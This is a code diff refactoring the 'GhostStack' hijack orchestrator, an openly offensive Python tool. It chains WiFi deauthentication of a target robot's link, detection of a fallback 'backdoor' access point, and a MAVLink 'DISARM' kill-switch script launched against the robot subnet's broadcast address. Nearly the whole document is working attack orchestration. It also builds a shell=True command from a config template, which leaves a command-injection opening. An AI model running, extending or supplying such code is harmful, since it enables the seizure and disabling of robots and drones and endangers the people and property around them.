@@ -1,27 +1,19 @@
-import sqlite3
-import time
-import subprocess
 import logging
+import subprocess
+import time
 
-# GhostStack: Advanced Exploitation - Hijack Orchestrator
-#
-# Fuses the Unitree detector, WiFi Deauth, and MAVLink Kill-Switch into a
-# reactive state machine. 
-#
-# Logic:
-# 1. Detect a target robot's primary link.
-# 2. Deauthenticate the link to force failover.
-# 3. Detect the "Backdoor" AP activation.
-# 4. Inject MAVLink 'DISARM' commands over the unauthenticated AP.
+from ghoststack.config_loader import load_targets, resolve_template
+from ghoststack.database import EventStore
 
-logging.basicConfig(level=logging.INFO, format='%(asctime)s - [HIJACK_ORCH] - %(message)s')
-DB_PATH = "ghoststack.db"
+logging.basicConfig(level=logging.INFO, format="%(asctime)s - [HIJACK_ORCH] - %(message)s")
+
 
 class HijackOrchestrator:
-    def __init__(self, interface="wlan0mon"):
-        self.interface = interface
+    def __init__(self):
+        self.store = EventStore()
+        self.targets = load_targets()
         self.last_id = 0
-        self.hijack_state = "IDLE" # IDLE, DEAUTHING, HIJACKING
+        self.hijack_state = "IDLE"
 
     def run(self):
         logging.info("[*] Starting Hijack Orchestrator...")
@@ -31,32 +23,26 @@ class HijackOrchestrator:
 
     def _poll_db(self):
         try:
-            conn = sqlite3.connect(DB_PATH)
-            c = conn.cursor()
-            c.execute('SELECT * FROM events WHERE id > ?', (self.last_id,))
-            rows = c.fetchall()
-            conn.close()
-
-            for row in rows:
+            for row in self.store.get_events_after(self.last_id):
                 self.last_id = row[0]
-                event = row[3]
+                module, event = row[2], row[3]
 
-                if "QUADRUPED_DETECT" in row[2]:
+                if module == "unitree-detect":
                     if "BACKDOOR AP DETECTED" in event and self.hijack_state == "DEAUTHING":
                         logging.info("[!] Backdoor AP confirmed. Initiating MAVLink Hijack...")
                         self.hijack_state = "HIJACKING"
-                        # Launch Kill-Switch targeting the Unitree subnet
-                        subprocess.Popen("python3 network_analysis/robot_research/mavlink_killswitch.py 192.168.123.255", shell=True)
+                        cmd = resolve_template(
+                            "python3 network_analysis/robot_research/mavlink_killswitch.py {mavlink_broadcast}",
+                            self.targets,
+                        )
+                        subprocess.Popen(cmd, shell=True)
 
-                if "FLOCK_DETECTOR" in row[2] or "remote-id" in row[2]:
-                    if self.hijack_state == "IDLE":
-                        # Extract MAC from event and initiate deauth (requires manual gateway MAC for now)
-                        logging.info("[*] Target detected. Ready for manual Deauth -> Hijack command.")
-                        # In a fully automated version, we would extract MAC and call wifi_deauth.py
+                if module in ("remote-id", "flock-detector") and self.hijack_state == "IDLE":
+                    logging.info("[*] Target detected. Ready for Deauth -> Hijack sequence.")
 
-        except Exception as e:
-            logging.error(f"Orchestration error: {e}")
+        except Exception as exc:
+            logging.error(f"Orchestration error: {exc}")
+
 
 if __name__ == "__main__":
-    orch = HijackOrchestrator()
-    orch.run()
+    HijackOrchestrator().run()
